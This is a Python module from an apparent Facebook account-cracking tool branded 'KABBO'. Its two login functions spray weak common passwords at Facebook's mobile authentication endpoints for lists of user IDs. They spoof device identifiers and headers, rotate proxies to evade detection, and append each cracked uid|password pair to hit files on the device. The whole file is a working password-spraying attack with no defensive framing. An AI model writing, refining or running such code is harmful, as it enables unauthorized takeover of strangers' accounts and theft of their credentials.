import sys
import time
import requests
import config
from useragent import window1
from uid import creationyear, fake_device_ids
from proxy import next_proxy

G   = '\x1b[38;5;46m'
Y   = '\x1b[38;5;220m'
CY  = '\x1b[38;5;51m'
W   = '\x1b[1;97m'
DIM = '\x1b[2;37m'
R   = '\x1b[38;5;196m'
RST = '\x1b[0m'


def _status_line(method):
    sys.stdout.write(
        f"\r  {DIM}❯ KABBO-M{method}{RST}  "
        f"Tried {CY}{config.loop}{RST}  {DIM}│{RST}  "
        f"Hits {G}{len(config.oks)}{RST}    "
    )
    sys.stdout.flush()


def _hit_line(method, uid, pw):
    year = creationyear(uid)
    year_str = f"  {DIM}│{RST}  {G}{year}{RST}" if year else ''
    sys.stdout.write(
        f"\r  {G}✔{RST}  {CY}KABBO-M{method}{RST}  "
        f"{W}{uid}{RST}  {DIM}│{RST}  {Y}{pw}{RST}{year_str}\n"
    )
    sys.stdout.flush()


def login_1(uid):
    session = requests.session()
    session.proxies = next_proxy() or {}
    try:
        for pw in ('123456', '1234567', '12345678', '123456789'):
            _status_line(1)
            ids  = fake_device_ids()
            data = {
                'adid': ids['adid'],
                'format': 'json',
                'device_id': ids['device_id'],
                'cpl': 'true',
                'family_device_id': ids['family_device_id'],
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': ids['advertiser_id'],
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d',
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
            }
            res = session.post(
                'https://b-graph.facebook.com/auth/login',
                data=data, headers=headers, allow_redirects=False
            ).json()
            if 'session_key' in res or 'www.facebook.com' in res.get('error', {}).get('message', ''):
                _hit_line(1, uid, pw)
                open('/sdcard/KABBO-M1-HITS.txt', 'a').write(f"{uid}|{pw}\n")
                config.oks.append(uid)
                break
        config.loop += 1
    except Exception:
        time.sleep(5)


def login_2(uid):
    from random import randint as rr
    _proxy = next_proxy() or {}
    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
        _status_line(2)
        try:
            with requests.Session() as session:
                session.proxies = _proxy
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                    'x-fb-sim-hni': str(rr(20000, 40000)),
                    'x-fb-net-hni': str(rr(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': window1(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger',
                }
                url = (
                    f"https://b-api.facebook.com/method/auth.login?format=json"
                    f"&email={uid}&password={pw}"
                    f"&credentials_type=device_based_login_password"
                    f"&generate_session_cookies=1&error_detail_type=button_with_disabled"
                    f"&source=device_based_login&meta_inf_fbmeta=%20"
                    f"&currently_logged_in_userid=0&method=GET&locale=en_US"
                    f"&client_country_code=US"
                    f"&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler"
                    f"&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                    f"&fb_api_req_friendly_name=authenticate&cpl=true"
                )
                po = session.get(url, headers=headers).json()
                if 'session_key' in str(po):
                    _hit_line(2, uid, pw)
                    open('/sdcard/KABBO-M2-HITS.txt', 'a').write(f"{uid}|{pw}\n")
                    config.oks.append(uid)
                    break
        except Exception:
            pass
    config.loop += 1
